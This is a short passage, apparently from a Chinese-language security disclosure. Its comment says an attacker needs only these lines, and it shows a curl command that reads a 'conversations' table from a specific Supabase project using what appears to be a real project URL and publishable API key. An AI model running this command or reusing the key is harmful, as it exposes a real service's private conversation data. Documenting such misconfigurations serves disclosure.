...
```bash
# 攻击者只需要这两行代码
curl "https://cnszooaxwxatezodbbxq.supabase.co/rest/v1/conversations" \
  -H "apikey: sb_publishable_VwrPo1L5FuCwCYwmveIZoQ_KqEr8oLe" \
  -H "Authorization: Bearer sb_publishable_VwrPo1L5FuCwCYwmveIZoQ_KqEr8oLe"
